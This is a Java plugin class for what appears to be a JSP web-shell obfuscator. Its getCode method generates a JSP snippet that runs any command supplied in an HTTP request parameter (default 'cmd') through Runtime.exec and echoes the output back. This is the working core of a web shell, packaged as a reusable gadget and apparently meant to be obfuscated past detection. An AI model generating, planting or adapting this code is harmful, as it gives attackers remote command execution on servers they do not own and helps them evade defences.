package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.gadget.GadgetExtension;
import org.pf4j.Extension;

import java.util.List;

@Extension
public class RuntimeExec implements GadgetExtension {

  @Override
  public void initExtension(ExtensionContext ctx) {
    ctx.registerStringInput("CommandParameter", true, "cmd");
  }

  @Override
  public List<String> getCode(ExtensionContext ctx) {
    String commandParameter = ctx.getStringInput("CommandParameter");
    return List.of(
        String.format(
"""
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("%s")).getInputStream();
byte[] b = new byte[2048];
int len;
while((len=in.read(b))!=-1){
    out.write(new String(b,0,len));
}
""",
            commandParameter));
  }

  @Override
  public List<String> getDeclaration(ExtensionContext ctx) {
    return List.of();
  }

  @Override
  public List<String> getImports(ExtensionContext ctx) {
    return List.of();
  }
}
